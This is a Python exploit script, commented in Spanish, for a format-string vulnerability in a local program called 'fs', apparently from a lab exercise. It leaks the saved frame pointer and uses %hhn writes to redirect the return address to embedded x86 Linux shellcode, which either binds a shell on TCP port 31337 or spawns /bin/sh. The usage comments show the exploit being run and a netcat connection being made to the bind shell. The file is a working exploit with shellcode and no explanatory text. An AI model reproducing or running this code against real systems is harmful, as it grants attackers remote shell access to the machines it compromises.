#! /usr/bin/env python

import sys

from struct import pack

# TERM 1 $ echo "%518\$08x" | ./fs                      # muestra ebp anterior (a main)
# TERM 1 $ echo "%519\$08x" | ./fs                      # muestra return address (a main)
# TERM 1 $ (./fs-exploit.py $(echo "%518\$08x" | ./fs) && cat) | ./fs     # enter -> rock!!
# TERM 2 $ netcat localhost 31337                       # enter -> rock!!

def compute_offset(address, byte_count):
    offset = 256

    for i in range(0, 256):
        if (offset + byte_count) % 256 == address % 256:
            break
        else:
            offset += 1

    return offset

# TCP bind shell
PORT = "\x7a\x69" # HL

tcpbindshell  = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66"
tcpbindshell += "\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89"
tcpbindshell += "\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52"
tcpbindshell += "\x66\x68"+PORT+"\x66\x53\x89\xe1\x6a\x10"
tcpbindshell += "\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04"
tcpbindshell += "\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
tcpbindshell += "\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3"
tcpbindshell += "\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
tcpbindshell += "\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68"
tcpbindshell += "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89"
tcpbindshell += "\xe1\x52\x89\xe2\xb0\x0b\xcd\x80";

# spawn a shell
shell  = "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
shell += "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
shell += "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

shellcode = tcpbindshell
# shellcode = shell

ebp_main = int(sys.argv[1], 16)
ebp = (ebp_main & 0xfffffff0) - 2 * 0x4

ret_addr = ebp+0x4
echobuff_addr = ebp-0x808
shellcode_addr = echobuff_addr+0x700

shellcode_addr_1 = (shellcode_addr & 0x000000ff) >>  0
shellcode_addr_2 = (shellcode_addr & 0x0000ff00) >>  8
shellcode_addr_3 = (shellcode_addr & 0x00ff0000) >> 16
shellcode_addr_4 = (shellcode_addr & 0xff000000) >> 24

# compute offsets
byte_count = 4 * 4
shellcode_addr_1_offset = compute_offset(shellcode_addr_1, byte_count)

byte_count += shellcode_addr_1_offset
shellcode_addr_2_offset = compute_offset(shellcode_addr_2, byte_count)

byte_count += shellcode_addr_2_offset
shellcode_addr_3_offset = compute_offset(shellcode_addr_3, byte_count)

byte_count += shellcode_addr_3_offset
shellcode_addr_4_offset = compute_offset(shellcode_addr_4, byte_count)

exploit  = pack("<I", ret_addr + 0x0)
exploit += pack("<I", ret_addr + 0x1)
exploit += pack("<I", ret_addr + 0x2)
exploit += pack("<I", ret_addr + 0x3)

exploit += "A" * shellcode_addr_1_offset
exploit += "%4$hhn"
exploit += "B" * shellcode_addr_2_offset
exploit += "%5$hhn"
exploit += "C" * shellcode_addr_3_offset
exploit += "%6$hhn"
exploit += "D" * shellcode_addr_4_offset
exploit += "%7$hhn"

assert len(exploit) < 0x700, len(exploit)

padding_size = (shellcode_addr - echobuff_addr - len(exploit))

exploit += "P" * padding_size
exploit += shellcode

sys.stdout.write(exploit)
